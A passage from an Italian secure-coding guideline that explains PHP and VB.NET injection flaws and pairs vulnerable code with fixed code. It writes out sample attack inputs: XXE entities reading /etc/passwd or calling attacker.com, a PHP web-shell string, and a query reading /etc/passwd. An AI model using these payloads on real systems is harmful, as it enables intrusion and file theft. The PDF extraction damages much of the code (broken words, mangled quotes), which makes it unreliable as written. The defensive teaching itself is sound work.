Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html,  
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 127  a 156  
 
7.9.4  File Disclosure 
Come riconoscerla 
Si ha quando l’applicazione si affida all’input del l’utente per decidere a quali file o directory acce dere. Se 
l’input non viene verificato né bonificato, un mali ntezionato può scegliere di leggere file arbitrari oltre 
quelli previsti, divulgando il contenuto di questi file. 
Questa vulnerabilità  è sovrapponibile al path trav ersal, cui ci si riferisce di solito per indicare l ’abusto di 
percorsi in input. 
Come difendersi 
• Occorre prendere in considerazione l'utilizzo di un a soluzione statica per la lettura di file, ad 
esempio un elenco di file consentiti da cui poter s cegliere. Oppure si potrebbe utilizzare un 
database, al posto di file e directory.  
• Se la lettura di file locali dal disco è assolutame nte necessaria, assicurarsi che i file vengano lett i da 
una cartella specifica e limitare l'accesso al codi ce solo a questa cartella; inoltre, quando un utent e 
fornisce un percorso, è necessario ripulire la stri nga dagli eventuali metacaratteri tipici del file 
system, come le barre e i punti, per impedire ogni tentativo di manipolazione del percorso per 
accedere a una directory riservata.  
 
Esempio: 
Codice vulnerabile: 
if (isset($_GET['imagenamè])) { 
 $filename = $_GET['imagenamè]; // qui un attaccant e può fornire un 
percorso  
        // assoluto come "/etc/passwd" 
 readfile($filename); 
} 
 
La versione sicura toglie di mezzo il path, rendend o impossibile l’abuso: 
if (isset($_GET['imagenamè])) { 
 $filename = getcwd()."/images/".basename($_GET['im agenamè]); 
 readfile($filename); 
} 
 
Per ulteriori informazioni si veda: https://cwe.mitre.org/data/definitions/538.html  
CWE-538: File and Directory Information Exposure 
7.9.5  Remote File Inclusion 
Come riconoscerla 
Un malintenzionato potrebbe tramite questa vulnerab ilità avere accesso alle librerie di sistema presen ti sul 
server. Se non adeguatamente protette, potrebbero e ssere attaccate librerie di sistema installate sul server 
(ad esempio in caso di attacco nella fase di carica mento delle stesse librerie) rendendo il sistema 
completamente sotto controllo dell'attaccante. 
Ciò può accadere perché l'applicazione utilizza i d ati non attendibili ricevuti tramite l'input dell'u tente per 
caricare dinamicamente la libreria, senza una corre tta sanitizzazione. Il framework malevolo caricherà  
qualsiasi codice arbitrario specificato dall'applic azione, e potrebbe anche scaricare file di codice r emoto 
ospitati su un server esterno, se specificato. Il c odice caricato verrà quindi eseguito come se fosse un 
software assolutamente affidabile rendendo il siste ma estremamente vulnerabile. 
Come difendersi 
• Non caricare in modo dinamico le librerie relative a codice software, in particolare basate sull'input  
non controllato dell'utente. 
 
 
Linee guida per lo sviluppo sicuro Pag. 128  a 156  
 
• Nel caso fosse necessario utilizzare dati utente no n attendibili per selezionare la libreria da carica re, 
verificare che l'input corrisponda a un insieme pre definito di nomi rigidamente indicati in una 
"white list" o comunque selezionare esclusivamente da elenchi di nomi controllati relativamente a 
possibili librerie software. 
 
Esempio  
Forma non corretta (con lettura dinamica di una lib reria indicate in modo arbitrario da un utente): 
var  qs = require ('querystring' ); 
var  server = http.createServer( function  (request, response) { 
 var  libName = qs.parse(request.url).libName;  
 if  (typeof  libName != "undefined" ) { 
  var  dynamicLib = require (libName);  
  } 
} 
Forma corretta tramite “white list”: 
var  qs = require ('querystring' ); 
var  server = http.createServer( function  (request, response) { 
 var  libName = qs.parse(request.url).libName;  
 var  dynamicLib;  
 if  (typeof  libName != "undefined" ) { 
  if  (libName == 'user' )  
     dynamicLib = require ('userLib' );  
    else  if  (libName == 'special' ) 
      dynamicLib = require ('specialUserLib' );  
    else   
      dynamicLib = require ('anonymousLib' ); 
  } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/98.html,  
CWE-98: Improper Control of Filename for Include/Re quire Statement in PHP Program ('PHP Remote File 
Inclusion'). 
7.9.6  File Manipulation 
Come riconoscerla 
Se un malintenzionato può influire su file arbitrar i di propria scelta ed è in grado di sovrascrivere o 
corrompere file di sistema, Potrebbe agevolmente ca usare un DoS (denial of service). Se il malintenzio nato 
in questione ha la possibilità di modificare il con tenuto di detti file, il pericolo che venga eseguit o del codice 
dannoso è molto concreta. 
Questa vulnerabilità (indicata con il nome esteso d i “Files or Directories Accessible to External Part ies”) ha 
come conseguenza la possibilità che file o director y siano accessibili ad utenti esterni malintenziona ti. 
È una variante della vulnerabilità indicata come Fi le Disclosure con possibile manipolazione di file d i sistema 
esistenti sul server attaccato.  
Come difendersi 
Prendere in considerazione l'utilizzo di una soluzi one statica per i file a cui è consentita la scritt ura. Ad 
esempio un elenco di file scrivibili verificati o u na diversa soluzione di archiviazione dei file, com e un 
database. Se assolutamente necessario, limitare la scrittura della destinazione in una singola cartell a 
disinfettando correttamente gli input forniti dall' utente per il nome di file e cartelle. Considerare di 
integrare questo con un segno di spunta per garanti re l'esistenza o meno di un file, in base ai requis iti 
aziendali del codice dell'applicazione. 
 
Esempio: 
Codice vulnerabile: 
if (isset($_GET['lognamè]) && isset($_GET['action'] )) { 
 
 
Linee guida per lo sviluppo sicuro Pag. 129  a 156  
 
  $action = str_replace(array("\n", "\r"), '',$_GET ['action']); // Toglie gli “a 
capo” 
 $filename = $_GET['lognamè]; // Un utente malinten zionato può fornire un 
"logname" che si trova sotto la webroot, creando un  file che verrebbe servito dal 
server 
 $file = fopen($filename,'a'); 
 fwrite($file, $action." was performed successfully .".PHP_EOL); // An attacker 
can set $action to "<?php passthru($_GET['c']); ?>" , resulting in a basic shell 
} 
Codice bonificato: 
if (isset($_GET['lognamè]) && isset($_GET['action'] )) { 
  $action = str_replace(array("\n", "\r"), '',$_GET ['action']); // Toglie gli “a 
capo” 
 $filename = "/var/log/application/".basename($_GET ['lognamè]); // // Può creare 
file di log arbitrari, ma limitati a una cartella s pecifica sul sistema. 
 $file = fopen($filename,'a'); 
 fwrite($file, $action." was performed successfully .".PHP_EOL); 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/552.html,  
CWE- 552: Files or Directories Accessible to Extern al Parties. 
 
7.9.7  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
 
Esempio: 
Codice vulnerabile: 
function checkIsUserAdmin() { 
  $username = $_POST['usernamè]; 
  $result = ldap_search($DS, $BASEDN, 
"(&(username={ $username })(memberOf={$ADMIN_GROUP}))", $LDAP_ATTRIBUTES); 
  $foundResults = !($result === FALSE); 
  return $foundResults; 
} 
Codice bonificato tramite regular expression: 
function checkIsUserAdmin() { 
  $username = $_POST['usernamè]; 
  $sanitizedUsername  = preg_replace("/[^[:alnum:][:space:]]/u", '', $use rname); 
  $result = ldap_search($DS, $BASEDN, 
"(&(username={ $sanitizedUsername })(memberOf={$ADMIN_GROUP}))", $LDAP_ATTRIBUTES); 
  $foundResults = !($result === FALSE); 
  return $foundResults; 
} 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 130  a 156  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.9.8  Reflected Injection 
Come riconoscerla 
La reflection attivata con l'input non verificato d ell'utente può, nella migliore delle ipotesi, dare origine a 
comportamenti imprevisti o causare l’instabilità de l sistema. Nel peggiore dei casi, può consentire ag li 
aggressori di iniettare ed eseguire codice dannoso,  invocare metodi o classi non previsti all'interno del 
codice, alterare il flusso logico, manipolare i dat i e altro ancora. 
La reflection è una tecnica di codifica in cui clas si, metodi o funzioni incorporate sono invocate a l ivello di 
codice dal loro nome. Se questo nome viene determin ato dinamicamente dagli input dell'utente, questi 
input possono modificare il flusso di codice, invoc are codice imprevisto o indesiderato e, a volte, co nsentire 
l'inserimento di nuovo codice dannoso. 
Si ha reflected injection quando l'applicazione uti lizza un input esterno di tipo reflection (dinamico  con 
input via web) per selezionare le classi o il codic e da utilizzare, senza effettuare i dovuti controll i. 
Come difendersi 
• Evitare di utilizzare qualsiasi forma di valutazion e dinamica del codice e, in particolare, evitare di  
utilizzare la reflection se non assolutamente neces sario. 
• Se non è richiesta un’esecuzione dinamica, utilizza re il flusso logico per determinare quali funzioni 
eseguire. 
• Se è necessaria un’esecuzione dinamica, applicare u na lista bianca (white list) di segmenti di codice 
consentiti, per garantire che il codice arbitrario non possa essere eseguito 
Esempio: 
Codice vulnerabile: 
function funzioneHelloWorld($name) { 
  return 'Hello '.htmlentities($name); 
} 
// Se si immette ?function=file_get_contents&arg=/e tc/passwd si potrà leggere il 
// contenuto del file /etc/passwd 
$funcName = isset($_GET['function']) ? $_GET['funct ion'] : "funzioneHelloWorld";; 
$arg = isset($_GET['arg']) ? $_GET['arg']: "Guest"; ; 
echo "Output: "; 
$func = new ReflectionFunction($funcName); 
echo $func->invoke($arg); 
 
Codice sicuro chiamato senza Reflection: 
function funzioneHelloWorld($name) { 
  return 'Hello ' . htmlentities($name); 
} 
$funcName = isset($_GET['function']) ? $_GET['funct ion'] : "funzioneHelloWorld";; 
$arg = isset($_GET['arg']) ? $_GET['arg']: "Guest"; ; 
if ($funcName == "funzioneHelloWorld") { 
 echo funzioneHelloWorld($arg); 
} else { 
 echo "  Funzione non attendibile!"; 
} 
 
Nel seguente codice la funzione funzioneHelloWorld( ) è chiamata con Reflection, garantendo che il nome  
della funzione sia attendibile: 
$funcName = isset($_GET['function']) ? $_GET['funct ion'] : "funzioneHelloWorld";; 
$arg = isset($_GET['arg']) ? $_GET['arg']: "Guest"; ; 
echo "Output: "; 
if ($funcName == "funzioneHelloWorld") { 
 $func = new ReflectionFunction($funcName); 
 echo $func->invoke($arg); 
} else { 
 
 
Linee guida per lo sviluppo sicuro Pag. 131  a 156  
 
 echo "Funzione non attendibile!"; 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/470.html,  
Use of Externally-Controlled Input to Select Classe s or Code ('Unsafe Reflection'). 
7.9.9  SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere bas ata 
su una white list: dovrebbero essere accettati solo  i dati che adattano a una struttura specificata, s cartando 
quelli che non rispettano la white list. Occorre co ntrollare il tipo del dato, la sua dimensione, l'in tervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" (non 
fornire agli utenti permessi più elevati di quelli strettamente necessari per svolgere il loro lavoro) . 
Esempio: 
Codice vulnerabile: 
$unsafe_variable = $_POST['user_input'];  
mysql_query(" SELECT * FROM tabella WHERE name = '$unsafe_variablè ");  
 
Codice sicuro: 
Utilizzando i Php Data Objets (PDO) si può scrivere  una query con i prepared statement: 
$stmt = $pdo->prepare('SELECT * FROM tabella WHERE name = :namè); 
$stmt->execute(array('namè => $name)); 
foreach ($stmt as $row) { 
  // Ciclo sulla riga ($row) 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,  
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.9.10   XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
 
 
Linee guida per lo sviluppo sicuro Pag. 132  a 156  
 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
Esempio  
L'applicazione utilizza una stringa inserita dall'u tente per costruire una query XPath: 
$user = $_GET["user"]; 
$pass = $_GET["pass"]; 
 
$doc = new DOMDocument(); 
$doc->load("test.xml"); 
$xpath = new DOMXPath($doc); 
 
$expression = "/users/user[@name='" . $user . "' an d @pass='" . $pass . "']"; 
$xpath->evaluate($expression); // Non sicuro 
 
La stringa inserita dall'utente viene sottoposta a encoding prima dell'uso nella query XPath: 
$user = $_GET["user"]; 
$pass = $_GET["pass"]; 
 
$doc = new DOMDocument(); 
$doc->load("test.xml"); 
$xpath = new DOMXPath($doc); 
 
$user = str_replace("'", "&apos;", $user); 
$pass = str_replace("'", "&apos;", $pass); 
 
$expression = "/users/user[@name='" . $user . "' an d @pass='" . $pass . "']"; 
$xpath->evaluate($expression);  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.9.11  XML External Entity (XXE) injection 
Come riconoscerla  
Si verifica quando un'applicazione fa il parsing e incorpora in automatico i riferimenti di entità DTD , 
all’interno di un documento XML. Se un attaccante p redispone un documento XML manipolato, può essere 
in grado di leggere arbitrariamente qualsiasi file del server. 
Potrebbe inserire, ad esempio, <! ENTITY xxe SYSTEM  "file: /// c: /boot.ini">.  
Dovrebbe poi aggiungere un riferimento che faccia r iferimento alla definizione di tale entità, ad es. <div> & 
xxe; </div>. Se il documento XML analizzato viene q uindi restituito all'utente, il risultato includerà  il 
contenuto sensibile del file di sistema. 
Ciò è causato dal parser XML, che è configurato per  analizzare automaticamente le dichiarazioni DTD e 
risolvere i riferimenti alle entità, invece di disa bilitare sia i riferimenti DTD che quelli esterni. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
Come difendersi 
La soluzione migliore, ovviamente, sarebbe quella d i evitare di elaborare direttamente l'input dell'ut ente, 
ove possibile. 
 
 
Linee guida per lo sviluppo sicuro Pag. 133  a 156  
 
Se necessario ricevere XML dall'utente, assicurarsi  che il parser XML sia limitato e vincolato. In par ticolare, 
disabilitare l'analisi e la risoluzione delle entit à DTD, applicare uno schema XML rigoroso sul server  e 
convalidare l'XML in input di conseguenza. 
Poiché tutte le funzionalità di analisi XML offerte  da PHP si basano sulle librerie libxml, esiste una  funzione 
che impedisce il caricamento di queste entità: 
<?php libxml_disable_entity_loader(true); ?> 
La funzione libxml_disable_entity_loader indica al parser di non tentare di interpretare i valori dell e entità 
nell'XML in entrata e di lasciarne intatti i riferi menti. Se si sta usando SimpleXML, questa è davvero  l'unica 
scelta per prevenire un attacco XXE nell'XML in arr ivo.  
Fortunatamente, gli altri due metodi di analisi XML  offrono alcune funzionalità che possono essere uti li a  
proteggere l’applicazione, pur consentendo l'espans ione delle entità XML. 
loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); ?>  
In entrambi i casi, stiamo aggiungendo alcuni valor i costanti predefiniti (per nome) che indicano al p arser di 
non consentire una connessione di rete durante il c aricamento (LIBXML_NONET) o di provare ad analizzar e 
l'XML in base al DTD (LIBXML_DTDLOAD|LIBXML_DTDATTR ). Entrambi questi metodi contribuiscono alla 
sicurezza dell’applicazione rispetto ai problemi di  XXE. 
7.9.12  Unsecure deserialization 
Come riconoscerla 
La “unsecure deserialization” è una vulnerabilità c he si verifica quando un’applicazione utilizza il p rocesso 
di deserializzazione di dati serializzati non atten dibili. Tra la serializzazione da parte del process o originario 
e la deserializzazione da parte del processo di des tinazione, i dati serializzati possono aver subito 
inserimenti di codice dannoso. 
In seguito a deserializzazione di dati inquinati co n porzioni di codice malevolo, l’attaccante può inf liggere un 
attacco di denial of service (DoS) o eseguire codic e arbitrario.  
Come difendersi 
Evitare di utilizzare le tecniche di serializzazion e/deserializzazione. Se è strettamente necessario u tilizzarle, 
verificare che il dato serializzato non possa esser e inquinato e manomesso durante il suo percorso. Ad  
esempio, garantire la trasmissione attraverso una c onnessione sicura e criptata. 
Controllare l'uso della funzione unserialize() e ri vedere come vengono accettati i parametri esterni. 
Utilizzare un formato di scambio di dati standard s icuro come JSON, tramite json_decode() e json_encod e(), 
se è necessario passare all'utente dati serializzat i. 
 
Esempio: 
Formato non corretto 
Creazione di un utente con una deserializzazioen. 
//.. JSON Validity Checks ..// 
$user_params = json_decode($HTTP_RAW_POST_DATA); 
$user = unserialize($user_params); 
Formato corretto 
Creazione di un utente senza deserializzazioen  
//.. JSON Validity Checks ..// 
$user_params = json_decode($HTTP_RAW_POST_DATA); 
//.. Parameter Checks ..// 
$name = $user_params['Namè]; 
$email = $user_params['Email']; 
$phone = $user_params['Phonè]; 
$user = new User($name, $email, $phone);  
 
Per maggiori informazioni: http://cwe.mitre.org/data/definitions/502.html  
 
 
Linee guida per lo sviluppo sicuro Pag. 134  a 156  
 
7.10  VBNET 
Visual Basic NET, abbreviato VBNET, è un linguaggio  di programmazione della suite Microsoft .NET, ered e di 
Visual Basic, che tanta fortuna ebbe un tempo. Cara tteristiche vincenti di VB.NET sono la sua semplici tà, 
l’orientamento agli oggetti, la condivisione della comune piattaforma .NET. Si pone come strumento ide ale 
da chi proviene dalla programmazione Visual Basic. 
 
Segue un elenco delle principali vulnerabilità e co ntromisure da adottare. 
7.10.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte integrante della pagina all’interno di u n database e rispristinato ogni qual volta la pagin a in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• La codifica dovrebbe essere sensibile al contesto, in base al tipo di dato che si vuole neutralizzare:  
se ci si aspetta che possa esserci codice HTML abus ivo, occorre codificare gli eventuali tag HTML, se 
ci si potrebbe trovare di fronte a uno script, allo ra bisogna codificare gli elementi sintattici di 
Javascript, ecc. 
• Si consiglia di utilizzare la libreria di codifica ESAPI. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 135  a 156  
 
7.10.2  Code Injection 
Come riconoscerla 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
 
Come difendersi . 
• È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è proprio 
necessario compilare ed eseguire del codice dinamic o, occorre allora predisporre una sandbox 
isolata, ad esempio AppDomain di .NET o un thread i solato.  
• Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato 
e dedicato che abbia privilegi solo per le operazio ni e i file specifici utilizzati dal codice da eseg uire, 
in base al principio denominato "Principle of Least  Privilege". Il principio stabilisce che agli utent i 
venga attribuito il più basso livello di “diritti” che possano, detenere rimanendo comunque in grado 
di compiere il proprio lavoro. 
Esempio: 
Il codice seguente mostra come del codice VB.NET pu ò essere passibile di code injection. Il codice ute nte 
viene accettato senza verifiche e compilato “al vol o”, quindi eseguito. 
  
Function EsecuziondeDinamicaCodiceUtente_NonSicuro( request As HttpRequest) As 
Integer 
 Dim exitCode As Integer 
 Dim codiceUtente As String = request.Form("Codice" ) 
  
 Dim compiler As New VBCodeProvider  
 Dim parameters As New CompilerParameters 
 parameters.GenerateInMemory = True 
 parameters.GenerateExecutable = True 
  
 Try  
  Dim results As CompilerResults = 
compiler.CompileAssemblyFromSource(parameters, codi ceUtente) 
   
  Dim compiledAssembly As Assembly = results.Compil edAssembly 
  exitCode = CInt(compiledAssembly.EntryPoint.Invok e(Nothing, New 
Object())) 
 Catch ex As Exception 
  HandleExceptions(ex) 
 End Try 
  
 Return exitCode 
End Function  
La seguente implementazione invece risolve il probl ema della code injection. Non viene eseguito del co dice, 
ma l’input dell’utente è usato per selezionare del codice precompilato che viene lanciato in un nuovo 
processo: 
Function EsecuziondeStaticaCodiceUtente(request As HttpRequest) As Integer 
 Dim exitCode As Integer 
 Dim parametriUtente As String = request.Form("ExeP arams") 
 
  Using proc As Process = New Process() 
  proc.StartInfo.FileName = PATH_TO_PRECOMPILED_EXT ERNAL_PROGRAM 
  proc.StartInfo.Arguments = SanitizeForProcess(par ametriUtente) 
  proc.StartInfo.UseShellExecute = False 
   
  proc.Start() 
 
 
Linee guida per lo sviluppo sicuro Pag. 136  a 156  
 
  proc.WaitForExit(MAX_TIMEOUT) 
   
  exitCode = proc.ExitCode 
 End Using 
  
 Return exitCode 
End Function 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html,  
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
7.10.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i non 
viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re verificare il tipo del dato, la sua dimensione, 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli pr ivilegi 
strettamente necessari, in base al principio denomi nato "Principle of Least Privilege". Il principio s tabilisce 
che agli utenti venga attribuito il più basso livel lo di “diritti” che possano detenere rimanendo comu nque in 
grado di compiere il proprio lavoro. 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html,  
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
7.10.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database. 
 
 
Linee guida per lo sviluppo sicuro Pag. 137  a 156  
 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata. 
• Le stringhe di connessione possono essere custodite  nel file web.config. Si tratta di una scelta 
migliore rispetto a comporle a runtime con l’input dell’utente. Si separa così l’applicazione dai 
metadati. Il file di configurazione in questione de ve essere messo in sicurezza attivano la modalità 
“protected configuration”, che permette di memorizz are le stringhe di connessione in forma 
crittografata (encrypted). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.10.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/90.html,  
 
 
Linee guida per lo sviluppo sicuro Pag. 138  a 156  
 
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.10.6  Resource Injection 
Come riconoscerla  
